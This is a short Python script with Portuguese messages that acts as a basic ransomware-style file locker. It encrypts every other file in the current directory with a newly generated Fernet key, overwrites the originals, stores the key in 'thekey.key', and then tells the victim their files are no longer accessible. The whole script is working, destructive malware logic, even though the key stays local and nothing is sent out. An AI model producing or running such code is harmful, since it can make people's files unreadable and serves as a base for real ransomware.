#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
os.system("clear")
print("Encriptando arquivos: ", files)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file, "rb") as thefile:
		content = thefile.read()
	content_encrypt = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encrypt)
print("Seus arquivos foram encriptados !!")  
print("\nAgora você não tem mais acesso ao conteúdo dos seus arquivos, e para fazer a descriptografia, você precisaria da mesma senha utilizada na criptografia original")
